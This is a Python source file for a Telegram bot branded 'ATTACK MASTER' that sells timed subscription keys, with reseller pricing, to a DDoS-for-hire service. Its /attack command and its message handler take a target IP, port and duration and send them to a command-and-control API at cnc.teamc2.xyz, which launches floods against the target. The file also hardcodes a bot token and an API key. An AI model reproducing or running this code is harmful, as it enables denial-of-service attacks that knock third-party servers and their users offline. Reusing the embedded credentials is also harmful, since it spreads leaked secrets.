#!/usr/bin/env python3

import telebot
from telebot.types import ReplyKeyboardMarkup
import threading
import os
import random
import string
import re
import sys
import json
from datetime import datetime, timedelta
import time
import requests

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ============= CONFIGURATION =============
BOT_TOKEN = "9230933269:AAHb_H4kkxmq2yW--vN5cSyB2TvC6EeJUsQ"
BOT_OWNER = 1885926472

# API List for attacks
API_LIST = [
    "http://cnc.teamc2.xyz:5001/api/attack?api_key=N0IHQO&target={ip}&port={port}&time={time}&concurrent=1",
    "http://cnc.teamc2.xyz:5001/api/attack?api_key=N0IHQO&target={ip}&port={port}&time={time}&concurrent=1",
    "http://cnc.teamc2.xyz:5001/api/attack?api_key=N0IHQO&target={ip}&port={port}&time={time}&concurrent=1",
    "http://cnc.teamc2.xyz:5001/api/attack?api_key=N0IHQO&target={ip}&port={port}&time={time}&concurrent=1",
]
    
    

# Settings
DEFAULT_MAX_ATTACK_TIME = 200
DEFAULT_USER_COOLDOWN = 60

# Reseller pricing
RESELLER_PRICING = {
    '12h': {'price': 50, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 100, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 250, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 500, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 1500, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 2500, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}

# ============= FILE STORAGE =============
DATA_FILE = "bot_data.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {
        "users": {},
        "keys": {},
        "resellers": {},
        "attack_logs": [],
        "settings": {
            "max_attack_time": 200,
            "user_cooldown": 180,
            "concurrent_limit": 4,
            "maintenance_mode": False,
            "maintenance_msg": "🔧 Bot maintenance mein hai. Baad mein try karo.",
            "blocked_ips": [],
            "port_protection": True
        }
    }

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2, default=str)

data = load_data()
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ============= HELPER FUNCTIONS =============
def is_owner(user_id):
    return user_id == BOT_OWNER

def is_reseller(user_id):
    reseller = data["resellers"].get(str(user_id))
    return reseller is not None and not reseller.get('blocked')

def get_setting(key, default):
    return data["settings"].get(key, default)

def set_setting(key, value):
    data["settings"][key] = value
    save_data(data)

def get_max_attack_time():
    return get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai. Baad mein try karo.')

def has_valid_key(user_id):
    """Check if user has valid key - FIXED: Returns False for expired users"""
    user = data["users"].get(str(user_id))
    if not user or not user.get('key_expiry'):
        return False
    try:
        expiry = datetime.fromisoformat(user['key_expiry'])
        if datetime.now() > expiry:
            # Key expired - delete user data
            if str(user_id) in data["users"]:
                del data["users"][str(user_id)]
                save_data(data)
            return False
        return True
    except:
        return False

def get_time_remaining_full(user_id):
    user = data["users"].get(str(user_id))
    if not user or not user.get('key_expiry'):
        return "Expired"
    try:
        remaining = datetime.fromisoformat(user['key_expiry']) - datetime.now()
        if remaining.total_seconds() <= 0:
            if str(user_id) in data["users"]:
                del data["users"][str(user_id)]
                save_data(data)
            return "Expired"
        days = remaining.days
        hours, r2 = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(r2, 60)
        return f"{days}d {hours}h {minutes}m"
    except:
        return "Error"

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    value = int(match.group(1))
    unit = match.group(2)
    mult = {'s': 1, 'm': 60, 'h': 3600, 'd': 86400}
    return value * mult[unit], f"{value}{unit}"

def generate_key(length=12):
    chars = string.ascii_uppercase + string.digits
    return f"BGMI-{''.join(random.choice(chars) for _ in range(length))}"

def generate_reseller_key(username, length=10):
    chars = string.ascii_uppercase + string.digits
    return f"{username}-{''.join(random.choice(chars) for _ in range(length))}"

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    try:
        return int(input_str), None
    except:
        pass
    for uid, user in data["users"].items():
        if user.get('username', '').lower() == input_str.lower():
            return int(uid), user.get('username')
    for uid, reseller in data["resellers"].items():
        if reseller.get('username', '').lower() == input_str.lower():
            return int(uid), reseller.get('username')
    return None, None

def get_ist_time():
    return (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')

# ============= ATTACK TRACKING =============
attack_lock = threading.Lock()
active_attacks = {}

def is_attack_running():
    with attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                del active_attacks[attack_id]
        return len(active_attacks) > 0

def get_active_attack_info():
    with attack_lock:
        now = datetime.now()
        for attack_id, attack in active_attacks.items():
            if attack['end_time'] > now:
                remaining = int((attack['end_time'] - now).total_seconds())
                return {
                    'running': True,
                    'username': attack.get('username', 'Unknown'),
                    'target': attack.get('target'),
                    'port': attack.get('port'),
                    'remaining': remaining,
                    'attack_id': attack_id,
                    'chat_id': attack.get('chat_id'),
                    'message_id': attack.get('message_id')
                }
        return {'running': False}

def log_attack(user_id, username, target, port, duration):
    data["attack_logs"].append({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now().isoformat()
    })
    if str(user_id) in data["users"]:
        data["users"][str(user_id)]["total_attacks"] = data["users"][str(user_id)].get("total_attacks", 0) + 1
    save_data(data)

# ============= KEYBOARDS =============

def get_main_keyboard(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    
    if is_owner(user_id):
        markup.row("🔥 ATTACK", "STATUS")
        markup.row("👤 PROFILE")
        markup.row("👑 OWNER PANEL")
        return markup
    
    if is_reseller(user_id) and not has_valid_key(user_id):
        markup.row("🔥 ATTACK")
        markup.row("🔑 REDEEM KEY")
        markup.row("💼 RESELLER PANEL")
        return markup
    
    if is_reseller(user_id) and has_valid_key(user_id):
        markup.row("🔥 ATTACK", "STATUS")
        markup.row("🔑 REDEEM KEY", "👤 PROFILE")
        markup.row("💼 RESELLER PANEL")
        return markup
    
    if has_valid_key(user_id):
        markup.row("🔥 ATTACK", "STATUS")
        markup.row("🔑 REDEEM KEY", "👤 PROFILE")
        return markup
    
    markup.row("🔑 REDEEM KEY")
    return markup

def get_non_active_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🔑 REDEEM KEY")
    return markup

def get_owner_keyboard_page1():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🔑 GEN KEY", "🗑️ DELETE KEY")
    markup.row("👤 USER DETAILS", "➕ ADD RESELLER")
    markup.row("💵 ADD BALANCE", "🗑️ REMOVE RESELLER")
    markup.row("⚙️ MAX ATTACK", "📢 BROADCAST")
    markup.row("👥 ALL USERS", "🔑 ALL KEYS")
    markup.row("⏰ EXTEND", "📊 EXTEND ALL")
    markup.row("📊 RESELLER USERS", "📊 SERVER STATUS")
    markup.row("❌ CANCEL", "🏠 MAIN MENU")
    markup.row("➡️ NEXT PAGE")
    return markup

def get_owner_keyboard_page2():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🚫 BAN USER", "✅ UNBAN USER")
    markup.row("🗑️ DELETE USER", "💰 SALDO CHECK")
    markup.row("🔧 MAINTENANCE ON", "✅ MAINTENANCE OFF")
    markup.row("⬅️ PREV PAGE", "❌ CANCEL")
    markup.row("🏠 MAIN MENU")
    return markup

def get_reseller_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🔑 GENERATE KEYS", "🗑️ DELETE USER")
    markup.row("📊 MY STATS", "💰 PRICING")
    markup.row("📊 RESELLER USERS", "📊 SERVER STATUS")
    markup.row("❌ CANCEL", "🏠 MAIN MENU")
    return markup

def get_back_keyboard():
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🏠 MAIN MENU")
    return markup

owner_page = {}

# ============= SILENT MESSAGE SENDER =============
def send_silent_message(chat_id, text):
    """Send message without reply markup"""
    try:
        bot.send_message(chat_id, text)
    except:
        pass

# ============= AUTO REFRESH FUNCTIONS =============

def attack_countdown_thread(chat_id, message_id, ip, port, duration, start_ist, attack_id):
    """Auto countdown for attack - updates every second"""
    remaining = duration
    while remaining > 0:
        time.sleep(1)
        remaining -= 1
        
        with attack_lock:
            if attack_id not in active_attacks:
                break
            current_remaining = int((active_attacks[attack_id]['end_time'] - datetime.now()).total_seconds())
            if current_remaining <= 0:
                break
        
        try:
            current_end_ist = (datetime.now() + timedelta(seconds=remaining) + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
            bot.edit_message_text(
                f"💀 ATTACK IN PROGRESS 💀\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n⚡ Time Left: {remaining}s\n\n📅 Started: {start_ist} IST\n⏰ Ends: {current_end_ist} IST",
                chat_id,
                message_id
            )
        except:
            pass
    
    # Attack finished - send completion message
    with attack_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    
    try:
        bot.edit_message_text(
            f"✅ ATTACK COMPLETE ✅\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n\n📅 Started: {start_ist} IST\n📅 Completed: {get_ist_time()} IST",
            chat_id,
            message_id
        )
    except:
        send_silent_message(chat_id, f"✅ ATTACK COMPLETE ✅\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n\n📅 Started: {start_ist} IST\n📅 Completed: {get_ist_time()} IST")

def server_status_auto_refresh(chat_id, message_id, user_id, is_owner_user):
    """Auto refresh server status every 5 seconds"""
    page = owner_page.get(user_id, 1) if is_owner_user else None
    
    while True:
        time.sleep(5)
        
        attack_info = get_active_attack_info()
        total_users = len(data["users"])
        active_users = 0
        for uid, u in data["users"].items():
            if u.get('key_expiry'):
                try:
                    expiry = datetime.fromisoformat(u['key_expiry'])
                    if expiry > datetime.now():
                        active_users += 1
                except:
                    pass
        
        if attack_info['running']:
            status_text = f"""📊 SERVER STATUS (Auto-Refresh)

🤖 Bot Info:
• Status: 🟢 ONLINE
• Server: 1
• Max Attack Time: {get_max_attack_time()}s

🔥 CURRENT ATTACK:
• User: @{attack_info['username']}
• Target: {attack_info['target']}:{attack_info['port']}
• Time Left: {attack_info['remaining']}s

👥 Users:
• Total: {total_users}
• Active: {active_users}

🔄 Auto-refresh every 5 seconds..."""
        else:
            status_text = f"""📊 SERVER STATUS (Auto-Refresh)

🤖 Bot Info:
• Status: 🟢 ONLINE
• Server: 1
• Max Attack Time: {get_max_attack_time()}s

🔥 CURRENT ATTACK: IDLE

👥 Users:
• Total: {total_users}
• Active: {active_users}

🔄 Auto-refresh every 5 seconds..."""
        
        try:
            bot.edit_message_text(status_text, chat_id, message_id)
        except:
            break

# ============= BOT COMMANDS =============

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = message.from_user.id
    username = message.from_user.username or message.from_user.first_name
    
    if is_maintenance() and not is_owner(user_id):
        bot.reply_to(message, get_maintenance_msg(), reply_markup=None)
        return
    
    if is_owner(user_id):
        text = f"""⚡ ATTACK MASTER ⚡

Welcome @{username}! 👤
─────────────────────
👑 OWNER PANEL ACTIVE

👥 Users: {len(data['users'])}
🔑 Keys: {len(data['keys'])}
💰 Resellers: {len(data['resellers'])}
⚔️ Attacks: {len(data['attack_logs'])}

─────────────────────"""
        bot.send_message(message.chat.id, text, reply_markup=get_main_keyboard(user_id))
        return
    
    if is_reseller(user_id):
        r = data["resellers"].get(str(user_id), {})
        if has_valid_key(user_id):
            remaining = get_time_remaining_full(user_id)
            text = f"""⚡ ATTACK MASTER ⚡

Welcome @{username}! 👤
─────────────────────
🎉 YOU ARE A RESELLER!

💰 BALANCE: {r.get('balance', 0)} RS
🔑 KEYS GENERATED: {r.get('total_keys_generated', 0)}
✅ ACCOUNT ACTIVE
⏰ Time Left: {remaining}

─────────────────────"""
        else:
            text = f"""⚡ ATTACK MASTER ⚡

Welcome @{username}! 👤
─────────────────────
🎉 YOU ARE A RESELLER!

💰 BALANCE: {r.get('balance', 0)} RS
🔑 KEYS GENERATED: {r.get('total_keys_generated', 0)}
⚠️ NO ACTIVE KEY! USE REDEEM KEY BUTTON TO ACTIVATE ATTACK!

─────────────────────"""
        bot.send_message(message.chat.id, text, reply_markup=get_main_keyboard(user_id))
        return
    
    if has_valid_key(user_id):
        remaining = get_time_remaining_full(user_id)
        attacks = data["users"].get(str(user_id), {}).get("total_attacks", 0)
        text = f"""⚡ ATTACK MASTER ⚡

Welcome @{username}! 👤
─────────────────────
✅ ACCOUNT ACTIVE

⏰ Time Left: {remaining}
🎯 Total Attacks: {attacks}

─────────────────────"""
        bot.send_message(message.chat.id, text, reply_markup=get_main_keyboard(user_id))
        return
    
    text = f"""⚡ ATTACK MASTER ⚡

Welcome @{username}! 👤
─────────────────────
⚠️ YOU DO NOT HAVE AN ACTIVE SUBSCRIPTION!

─────────────────────
Use REDEEM KEY button to activate!"""
    bot.send_message(message.chat.id, text, reply_markup=get_non_active_keyboard())

# ============= EXTEND COMMANDS =============

@bot.message_handler(commands=['extend'])
def cmd_extend(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /extend <user_id> <time>\nExample: /extend 123456789 1d")
        return
    
    try:
        tid = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid user ID!")
        return
    
    secs, label = parse_duration(parts[2].lower())
    if not secs:
        bot.reply_to(message, "❌ Invalid time! Use: 10m, 1h, 1d")
        return
    
    if str(tid) not in data["users"] or not data["users"][str(tid)].get('key_expiry'):
        bot.reply_to(message, "❌ User doesn't have an active key!")
        return
    
    u = data["users"][str(tid)]
    old_expiry = datetime.fromisoformat(u['key_expiry'])
    if old_expiry < datetime.now():
        bot.reply_to(message, "❌ User's key has already expired!")
        return
    
    new_expiry = old_expiry + timedelta(seconds=secs)
    u['key_expiry'] = new_expiry.isoformat()
    save_data(data)
    
    bot.reply_to(message, f"✅ Time Extended!\n\n👤 User: {tid}\n⏰ Added: {label}\n📅 New Expiry: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}")

@bot.message_handler(commands=['extend_all'])
def cmd_extend_all(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /extend_all <time>\nExample: /extend_all 1d")
        return
    
    secs, label = parse_duration(parts[1].lower())
    if not secs:
        bot.reply_to(message, "❌ Invalid time! Use: 10m, 1h, 1d, 7d, 30d")
        return
    
    count = 0
    for uid, user in data["users"].items():
        if user.get('key_expiry'):
            expiry = datetime.fromisoformat(user['key_expiry'])
            if expiry > datetime.now():
                new_expiry = expiry + timedelta(seconds=secs)
            else:
                new_expiry = datetime.now() + timedelta(seconds=secs)
            user['key_expiry'] = new_expiry.isoformat()
            count += 1
    
    save_data(data)
    bot.reply_to(message, f"✅ {count} users ka time extend ho gaya!\n⏰ Added: {label}")

# ============= ATTACK COMMAND =============

@bot.message_handler(commands=['attack'])
def cmd_attack(message):
    user_id = message.from_user.id
    
    # FIXED: Check if user has valid key (owner bypass)
    if not is_owner(user_id) and not has_valid_key(user_id):
        bot.reply_to(message, "❌ You don't have an active key!\n\nUse REDEEM KEY button to activate.", reply_markup=get_non_active_keyboard())
        return
    
    if is_attack_running():
        attack_info = get_active_attack_info()
        bot.reply_to(message, 
            f"❌ Attack already running!\n\n👤 User: @{attack_info['username']}\n🎯 Target: {attack_info['target']}:{attack_info['port']}\n⏰ Time Left: {attack_info['remaining']}s\n\nOnly 1 attack allowed at a time!",
            reply_markup=get_main_keyboard(user_id))
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <ip> <port> <time>\nExample: /attack 1.1.1.1 80 60")
        return
    
    ip, port_str, dur_str = parts[1], parts[2], parts[3]
    
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        bot.reply_to(message, "❌ Invalid IP address!", reply_markup=get_main_keyboard(user_id))
        return
    
    try:
        port = int(port_str)
        dur = int(dur_str)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port! (1-65535)", reply_markup=get_main_keyboard(user_id))
            return
        if dur < 1:
            bot.reply_to(message, "❌ Duration must be at least 1 second!", reply_markup=get_main_keyboard(user_id))
            return
        if dur > get_max_attack_time() and not is_owner(user_id):
            bot.reply_to(message, f"❌ Max attack time is {get_max_attack_time()}s! You sent {dur}s.", reply_markup=get_main_keyboard(user_id))
            return
    except:
        bot.reply_to(message, "❌ Invalid port or time!", reply_markup=get_main_keyboard(user_id))
        return
    
    start_ist = get_ist_time()
    end_dt = datetime.now() + timedelta(seconds=dur)
    end_ist = (end_dt + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
    
    sent_msg = bot.reply_to(message,
        f"💀 ATTACK STARTED 💀\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {dur}s\n⚡ Time Left: {dur}s\n\n📅 Started: {start_ist} IST\n⏰ Ends: {end_ist} IST",
        reply_markup=get_main_keyboard(user_id))
    
    log_attack(user_id, message.from_user.username or str(user_id), ip, port, dur)
    
    attack_id = f"{user_id}_{datetime.now().timestamp()}"
    username = message.from_user.username or str(user_id)
    
    with attack_lock:
        active_attacks[attack_id] = {
            'target': ip, 'port': port, 'duration': dur,
            'user_id': user_id, 'username': username,
            'end_time': datetime.now() + timedelta(seconds=dur),
            'start_ist': start_ist,
            'chat_id': message.chat.id,
            'message_id': sent_msg.message_id
        }
    
    # Start countdown thread
    threading.Thread(target=attack_countdown_thread, args=(message.chat.id, sent_msg.message_id, ip, port, dur, start_ist, attack_id), daemon=True).start()
    
    # Send API request
    try:
        for api_url in API_LIST:
            if api_url:
                requests.get(api_url.format(ip=ip, port=port, time=dur), timeout=5)
    except:
        pass

# ============= ADDITIONAL OWNER COMMANDS =============

@bot.message_handler(commands=['ban'])
def cmd_ban(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /ban <user_id>")
        return
    
    try:
        tid = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid user ID!")
        return
    
    if tid == BOT_OWNER:
        bot.reply_to(message, "❌ Cannot ban owner!")
        return
    
    if str(tid) not in data["users"]:
        data["users"][str(tid)] = {'user_id': tid}
    data["users"][str(tid)]['banned'] = True
    save_data(data)
    bot.reply_to(message, f"🚫 User {tid} BANNED!")

@bot.message_handler(commands=['unban'])
def cmd_unban(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unban <user_id>")
        return
    
    try:
        tid = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid user ID!")
        return
    
    if str(tid) in data["users"]:
        data["users"][str(tid)]['banned'] = False
        save_data(data)
        bot.reply_to(message, f"✅ User {tid} UNBANNED!")

@bot.message_handler(commands=['saldo'])
def cmd_saldo(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /saldo <reseller_id>\nExample: /saldo 123456789")
        return
    
    try:
        rid = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid user ID!")
        return
    
    r = data["resellers"].get(str(rid))
    if not r:
        bot.reply_to(message, "❌ Reseller not found!")
        return
    
    bot.reply_to(message, f"💰 Reseller Balance\n\n👤 ID: {rid}\n💵 Balance: {r.get('balance', 0)} Rs\n🔑 Keys Generated: {r.get('total_keys_generated', 0)}")

@bot.message_handler(commands=['remove_reseller'])
def cmd_remove_reseller(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /remove_reseller <reseller_id>\nExample: /remove_reseller 123456789")
        return
    
    try:
        rid = int(parts[1])
    except:
        bot.reply_to(message, "❌ Invalid reseller ID!")
        return
    
    if str(rid) not in data["resellers"]:
        bot.reply_to(message, "❌ Reseller not found!")
        return
    
    del data["resellers"][str(rid)]
    save_data(data)
    bot.reply_to(message, f"✅ Reseller {rid} removed!")

@bot.message_handler(commands=['delkey'])
def cmd_delkey(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /delkey <key>\nExample: /delkey BGMI-ABCD1234")
        return
    
    key = parts[1]
    if key in data["keys"]:
        del data["keys"][key]
        save_data(data)
        bot.reply_to(message, f"✅ Key `{key}` deleted successfully!")
    else:
        bot.reply_to(message, f"❌ Key `{key}` not found!")

# ============= MAINTENANCE COMMANDS =============

@bot.message_handler(commands=['maintenance'])
def cmd_maintenance(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /maintenance <message>\nExample: /maintenance Bot is updating!")
        return
    
    set_setting('maintenance_mode', True)
    set_setting('maintenance_msg', parts[1])
    bot.reply_to(message, f"🔧 MAINTENANCE ON!\n\nMessage: {parts[1]}")

@bot.message_handler(commands=['ok'])
def cmd_ok(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    set_setting('maintenance_mode', False)
    bot.reply_to(message, "✅ MAINTENANCE OFF!\nBot is now available.")

# ============= MESSAGE HANDLER =============

user_state = {}

@bot.message_handler(func=lambda message: True)
def handle_messages(message):
    user_id = message.from_user.id
    text = message.text.strip()
    chat_id = message.chat.id
    
    if is_maintenance() and not is_owner(user_id):
        bot.send_message(chat_id, get_maintenance_msg(), reply_markup=None)
        return
    
    if user_id in user_state:
        action = user_state[user_id]["action"]
        
        if action == "owner_gen":
            del user_state[user_id]
            parts = text.split()
            if len(parts) != 2:
                bot.send_message(chat_id, "❌ Send: TIME COUNT\nExample: 1d 5\nFormats: 10m, 1h, 1d, 7d, 30d", reply_markup=get_owner_keyboard_page1())
                return
            
            secs, label = parse_duration(parts[0])
            if not secs:
                bot.send_message(chat_id, "❌ Invalid time! Use: 10m, 1h, 1d, 7d, 30d", reply_markup=get_owner_keyboard_page1())
                return
            
            try:
                count = int(parts[1])
                if count < 1 or count > 50:
                    bot.send_message(chat_id, "❌ Count must be 1-50!", reply_markup=get_owner_keyboard_page1())
                    return
            except:
                bot.send_message(chat_id, "❌ Invalid count!", reply_markup=get_owner_keyboard_page1())
                return
            
            keys = []
            for _ in range(count):
                k = generate_key(12)
                data["keys"][k] = {
                    'duration_seconds': secs, 'duration_label': label,
                    'created_at': datetime.now().isoformat(), 'created_by': user_id,
                    'used': False
                }
                keys.append(k)
            save_data(data)
            
            keys_text = ""
            for k in keys:
                keys_text += f"🔑 Key: <code>{k}</code>\n"
            bot.send_message(chat_id, f"✅ Key Generated!\n\n{keys_text}⏰ Duration: {label}", parse_mode="HTML", reply_markup=get_owner_keyboard_page1())
            return
        
        elif action == "owner_delkey":
            del user_state[user_id]
            key = text.strip()
            if key in data["keys"]:
                del data["keys"][key]
                save_data(data)
                bot.send_message(chat_id, f"✅ Key `{key}` deleted successfully!", reply_markup=get_owner_keyboard_page1())
            else:
                bot.send_message(chat_id, f"❌ Key `{key}` not found!", reply_markup=get_owner_keyboard_page1())
            return
        
        elif action == "owner_add_balance":
            del user_state[user_id]
            parts = text.split()
            if len(parts) != 2:
                bot.send_message(chat_id, "❌ Send: RESELLER_ID AMOUNT\nExample: 123456789 100", reply_markup=get_owner_keyboard_page1())
                return
            
            try:
                rid = int(parts[0])
                amt = int(parts[1])
            except ValueError:
                bot.send_message(chat_id, "❌ Invalid format! Send: RESELLER_ID AMOUNT\nExample: 123456789 100", reply_markup=get_owner_keyboard_page1())
                return
            
            if str(rid) not in data["resellers"]:
                bot.send_message(chat_id, f"❌ Reseller {rid} not found! First add them using ADD RESELLER button", reply_markup=get_owner_keyboard_page1())
                return
            
            if amt <= 0:
                bot.send_message(chat_id, "❌ Amount must be positive!", reply_markup=get_owner_keyboard_page1())
                return
            
            r = data["resellers"][str(rid)]
            old_balance = r.get('balance', 0)
            r['balance'] = old_balance + amt
            if 'total_keys_generated' not in r:
                r['total_keys_generated'] = 0
            save_data(data)
            bot.send_message(chat_id, f"✅ Added {amt} Rs to reseller {rid}!\n💰 Old Balance: {old_balance} Rs\n💰 New Balance: {r['balance']} Rs", reply_markup=get_owner_keyboard_page1())
            
            try:
                bot.send_message(rid, f"💰 Balance Updated!\n\n➕ Added: +{amt} Rs\n💰 New Balance: {r['balance']} Rs")
            except:
                pass
            return
        
        elif action == "attack":
            del user_state[user_id]
            parts = text.split()
            if len(parts) != 3:
                bot.send_message(chat_id, "❌ Invalid! Send: IP PORT TIME\nExample: 1.1.1.1 80 60", reply_markup=get_main_keyboard(user_id))
                return
            
            ip, port_str, dur_str = parts[0], parts[1], parts[2]
            
            if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
                bot.send_message(chat_id, "❌ Invalid IP address!", reply_markup=get_main_keyboard(user_id))
                return
            
            try:
                port = int(port_str)
                dur = int(dur_str)
                if port < 1 or port > 65535:
                    bot.send_message(chat_id, "❌ Invalid port! (1-65535)", reply_markup=get_main_keyboard(user_id))
                    return
                if dur < 1:
                    bot.send_message(chat_id, "❌ Duration must be at least 1 second!", reply_markup=get_main_keyboard(user_id))
                    return
                if dur > get_max_attack_time() and not is_owner(user_id):
                    bot.send_message(chat_id, f"❌ Max attack time is {get_max_attack_time()}s! You sent {dur}s.", reply_markup=get_main_keyboard(user_id))
                    return
            except:
                bot.send_message(chat_id, "❌ Invalid port or time!", reply_markup=get_main_keyboard(user_id))
                return
            
            # FIXED: Check if user has valid key
            if not is_owner(user_id) and not has_valid_key(user_id):
                bot.send_message(chat_id, "❌ You don't have an active key!\n\nUse REDEEM KEY button to activate.", reply_markup=get_non_active_keyboard())
                return
            
            if is_attack_running():
                attack_info = get_active_attack_info()
                bot.send_message(chat_id,
                    f"❌ Attack already running!\n\n👤 User: @{attack_info['username']}\n🎯 Target: {attack_info['target']}:{attack_info['port']}\n⏰ Time Left: {attack_info['remaining']}s\n\nOnly 1 attack allowed at a time!",
                    reply_markup=get_main_keyboard(user_id))
                return
            
            start_ist = get_ist_time()
            end_dt = datetime.now() + timedelta(seconds=dur)
            end_ist = (end_dt + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
            
            sent_msg = bot.send_message(chat_id,
                f"💀 ATTACK STARTED 💀\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {dur}s\n⚡ Time Left: {dur}s\n\n📅 Started: {start_ist} IST\n⏰ Ends: {end_ist} IST",
                reply_markup=get_main_keyboard(user_id))
            
            log_attack(user_id, message.from_user.username or str(user_id), ip, port, dur)
            
            attack_id = f"{user_id}_{datetime.now().timestamp()}"
            username = message.from_user.username or str(user_id)
            
            with attack_lock:
                active_attacks[attack_id] = {
                    'target': ip, 'port': port, 'duration': dur,
                    'user_id': user_id, 'username': username,
                    'end_time': datetime.now() + timedelta(seconds=dur),
                    'start_ist': start_ist,
                    'chat_id': chat_id,
                    'message_id': sent_msg.message_id
                }
            
            threading.Thread(target=attack_countdown_thread, args=(chat_id, sent_msg.message_id, ip, port, dur, start_ist, attack_id), daemon=True).start()
            
            try:
                for api_url in API_LIST:
                    if api_url:
                        requests.get(api_url.format(ip=ip, port=port, time=dur), timeout=5)
            except:
                pass
        
        elif action == "redeem":
            del user_state[user_id]
            key_input = text
            key_data = data["keys"].get(key_input)
            
            if not key_data:
                bot.send_message(chat_id, "❌ INVALID KEY!\n\nThis key does not exist.", reply_markup=get_main_keyboard(user_id))
                return
            
            if key_data.get('used'):
                bot.send_message(chat_id, "❌ KEY ALREADY USED!\n\nThis key has been redeemed.", reply_markup=get_main_keyboard(user_id))
                return
            
            # FIXED: Allow redeem if user has no key or key expired
            if has_valid_key(user_id):
                remaining = get_time_remaining_full(user_id)
                bot.send_message(chat_id, f"❌ YOU ALREADY HAVE ACCESS!\n\n⏳ Current key expires in: {remaining}", reply_markup=get_main_keyboard(user_id))
                return
            
            expiry_time = datetime.now() + timedelta(seconds=key_data['duration_seconds'])
            
            # Delete old user data if exists
            if str(user_id) in data["users"]:
                del data["users"][str(user_id)]
            
            data["users"][str(user_id)] = {
                'user_id': user_id,
                'username': message.from_user.username or message.from_user.first_name,
                'key': key_input,
                'key_expiry': expiry_time.isoformat(),
                'key_duration_label': key_data.get('duration_label', ''),
                'redeemed_at': datetime.now().isoformat(),
                'total_attacks': 0
            }
            
            key_data['used'] = True
            key_data['used_by'] = user_id
            save_data(data)
            
            remaining = get_time_remaining_full(user_id)
            
            bot.send_message(chat_id, 
                f"✅ KEY REDEEMED!\n\n🔑 Key: <code>{key_input}</code>\n⏰ Duration: {key_data.get('duration_label', 'N/A')}\n⏳ Time Left: {remaining}\n\n🔥 Now you can use ATTACK button!",
                parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
            
